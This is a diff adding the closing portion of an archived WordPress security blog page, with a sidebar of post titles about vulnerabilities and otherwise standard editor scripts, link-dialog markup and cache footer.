+				<a href="http://ceriksen.com/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
+						</li>
+				</ul>
+		</aside>		</div><!-- #secondary .widget-area -->
+	
+	</div><!-- #main -->
+	
+	
+	<footer id="colophon" role="contentinfo">
+		<div id="site-generator">
+						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
+					
+		</div>
+	</footer><!-- #colophon -->
+	
+		
+</div><!-- #page -->
+
+<link rel='stylesheet' id='wp-jquery-ui-dialog-css'  href='http://ceriksen.com/wp-includes/css/jquery-ui-dialog.min.css?ver=3.8.3' type='text/css' media='all' />
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wordCountL10n = {"type":"w"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-admin/js/word-count.min.js?ver=3.8.3'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var userSettings = {"url":"\/","uid":"0","time":"1405713413"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/utils.min.js?ver=3.8.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-admin/js/editor.min.js?ver=3.8.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.core.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.widget.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.mouse.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.resizable.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.draggable.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.button.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.position.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.dialog.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/plugins/wpdialogs/js/wpdialog.min.js?ver=3.8.3'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpLinkL10n = {"title":"Insert\/edit link","update":"Update","save":"Add Link","noTitle":"(no title)","noMatchesFound":"No matches found."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/wplink.min.js?ver=3.8.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/plugins/wpdialogs/js/popup.min.js?ver=3.8.3'></script>
+
+	<script type="text/javascript">
+		tinyMCEPreInit = {
+			base : "http://ceriksen.com/wp-includes/js/tinymce",
+			suffix : "",
+			query : "ver=359-20131026",
+			mceInit : {'comment':{mode:"exact",width:"100%",theme:"advanced",skin:"wp_theme",language:"en",theme_advanced_toolbar_location:"top",theme_advanced_toolbar_align:"left",theme_advanced_statusbar_location:"bottom",theme_advanced_resizing:true,theme_advanced_resize_horizontal:false,dialog_type:"modal",formats:{
+						alignleft : [
+							{selector : 'p,h1,h2,h3,h4,h5,h6,td,th,div,ul,ol,li', styles : {textAlign : 'left'}},
+							{selector : 'img,table', classes : 'alignleft'}
+						],
+						aligncenter : [
+							{selector : 'p,h1,h2,h3,h4,h5,h6,td,th,div,ul,ol,li', styles : {textAlign : 'center'}},
+							{selector : 'img,table', classes : 'aligncenter'}
+						],
+						alignright : [
+							{selector : 'p,h1,h2,h3,h4,h5,h6,td,th,div,ul,ol,li', styles : {textAlign : 'right'}},
+							{selector : 'img,table', classes : 'alignright'}
+						],
+						strikethrough : {inline : 'del'}
+					},relative_urls:false,remove_script_host:false,convert_urls:false,remove_linebreaks:true,gecko_spellcheck:true,fix_list_elements:true,keep_styles:false,entities:"38,amp,60,lt,62,gt",accessibility_focus:true,media_strict:false,paste_remove_styles:true,paste_remove_spans:true,paste_strip_class_attributes:"all",paste_text_use_dialog:true,webkit_fake_resize:false,preview_styles:"font-family font-weight text-decoration text-transform",schema:"html5",wpeditimage_disable_captions:false,wp_fullscreen_content_css:"http://ceriksen.com/wp-includes/js/tinymce/plugins/wpfullscreen/css/wp-fullscreen.css",plugins:"inlinepopups,tabfocus,paste,media,fullscreen,wordpress,wpeditimage,wpgallery,wplink,wpdialogs,-crayon_tinymce",elements:"comment",wpautop:true,apply_source_formatting:false,theme_advanced_buttons1:"bold,italic,strikethrough,bullist,numlist,blockquote,justifyleft,justifycenter,justifyright,link,unlink,wp_more,spellchecker,fullscreen,wp_adv,separator,crayon_tinymce",theme_advanced_buttons2:"formatselect,underline,justifyfull,forecolor,pastetext,pasteword,removeformat,charmap,outdent,indent,undo,redo,wp_help",theme_advanced_buttons3:"",theme_advanced_buttons4:"",tabfocus_elements:":prev,:next",body_class:"comment post-type-post post-status-publish post-format-standard",theme_advanced_resizing_use_cookie:true,extended_valid_elements:",pre[*],code[*],iframe[*]"}},
+			qtInit : {'comment':{id:"comment",buttons:"strong,em,link,block,del,ins,img,ul,ol,li,code,more,close"}},
+			ref : {plugins:"inlinepopups,tabfocus,paste,media,fullscreen,wordpress,wpeditimage,wpgallery,wplink,wpdialogs,-crayon_tinymce",theme:"advanced",language:"en"},
+			load_ext : function(url,lang){var sl=tinymce.ScriptLoader;sl.markDone(url+'/langs/'+lang+'.js');sl.markDone(url+'/langs/'+lang+'_dlg.js');}
+		};
+	</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/tiny_mce.js?ver=359-20131026'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/wp-tinymce-schema.js?ver=359-20131026'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/langs/wp-langs-en.js?ver=359-20131026'></script>
+
+	<script type="text/javascript">
+		var wpActiveEditor;
+
+		(function(){
+			var init, ed, qt, first_init, DOM, el, i, mce = 1;
+
+			if ( typeof(tinymce) == 'object' ) {
+				DOM = tinymce.DOM;
+				// mark wp_theme/ui.css as loaded
+				DOM.files[tinymce.baseURI.getURI() + '/themes/advanced/skins/wp_theme/ui.css'] = true;
+
+				DOM.events.add( DOM.select('.wp-editor-wrap'), 'mousedown', function(e){
+					if ( this.id )
+						wpActiveEditor = this.id.slice(3, -5);
+				});
+
+				for ( ed in tinyMCEPreInit.mceInit ) {
+					if ( first_init ) {
+						init = tinyMCEPreInit.mceInit[ed] = tinymce.extend( {}, first_init, tinyMCEPreInit.mceInit[ed] );
+					} else {
+						init = first_init = tinyMCEPreInit.mceInit[ed];
+					}
+
+					if ( mce )
+						try { tinymce.init(init); } catch(e){}
+				}
+			} else {
+				if ( tinyMCEPreInit.qtInit ) {
+					for ( i in tinyMCEPreInit.qtInit ) {
+						el = tinyMCEPreInit.qtInit[i].id;
+						if ( el )
+							document.getElementById('wp-'+el+'-wrap').onmousedown = function(){ wpActiveEditor = this.id.slice(3, -5); }
+					}
+				}
+			}
+
+			if ( typeof(QTags) == 'function' ) {
+				for ( qt in tinyMCEPreInit.qtInit ) {
+					try { quicktags( tinyMCEPreInit.qtInit[qt] ); } catch(e){}
+				}
+			}
+		})();
+		tinyMCEPreInit.load_ext("http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/util/tag-editor", "en");
+tinymce.PluginManager.load("crayon_tinymce", "http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/util/tag-editor/crayon_tinymce.js");
+
+			(function(){var t=tinyMCEPreInit,sl=tinymce.ScriptLoader,ln=t.ref.language,th=t.ref.theme,pl=t.ref.plugins;sl.markDone(t.base+'/langs/'+ln+'.js');sl.markDone(t.base+'/themes/'+th+'/langs/'+ln+'.js');sl.markDone(t.base+'/themes/'+th+'/langs/'+ln+'_dlg.js');sl.markDone(t.base+'/themes/advanced/skins/wp_theme/ui.css');tinymce.each(pl.split(','),function(n){if(n&&n.charAt(0)!='-'){sl.markDone(t.base+'/plugins/'+n+'/langs/'+ln+'.js');sl.markDone(t.base+'/plugins/'+n+'/langs/'+ln+'_dlg.js');}});})();
+			var ajaxurl = "/wp-admin/admin-ajax.php";		</script>
+			<div style="display:none;">
+	<form id="wp-link" tabindex="-1">
+	<input type="hidden" id="_ajax_linking_nonce" name="_ajax_linking_nonce" value="a25a108328" />	<div id="link-selector">
+		<div id="link-options">
+			<p class="howto">Enter the destination URL</p>
+			<div>
+				<label><span>URL</span><input id="url-field" type="text" name="href" /></label>
+			</div>
+			<div>
+				<label><span>Title</span><input id="link-title-field" type="text" name="linktitle" /></label>
+			</div>
+			<div class="link-target">
+				<label><input type="checkbox" id="link-target-checkbox" /> Open link in a new window/tab</label>
+			</div>
+		</div>
+				<p class="howto toggle-arrow " id="internal-toggle">Or link to existing content</p>
+		<div id="search-panel" style="display:none">
+			<div class="link-search-wrapper">
+				<label>
+					<span class="search-label">Search</span>
+					<input type="search" id="search-field" class="link-search-field" autocomplete="off" />
+					<span class="spinner"></span>
+				</label>
+			</div>
+			<div id="search-results" class="query-results">
+				<ul></ul>
+				<div class="river-waiting">
+					<span class="spinner"></span>
+				</div>
+			</div>
+			<div id="most-recent-results" class="query-results">
+				<div class="query-notice"><em>No search term specified. Showing recent items.</em></div>
+				<ul></ul>
+				<div class="river-waiting">
+					<span class="spinner"></span>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="submitbox">
+		<div id="wp-link-update">
+			<input type="submit" value="Add Link" class="button-primary" id="wp-link-submit" name="wp-link-submit">
+		</div>
+		<div id="wp-link-cancel">
+			<a class="submitdelete deletion" href="#">Cancel</a>
+		</div>
+	</div>
+	</form>
+	</div>
+	
+</body>
+</html>
+<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/
+
+Page Caching using disk: enhanced
+
+ Served from: ceriksen.com @ 2014-07-18 19:56:53 by W3 Total Cache -->
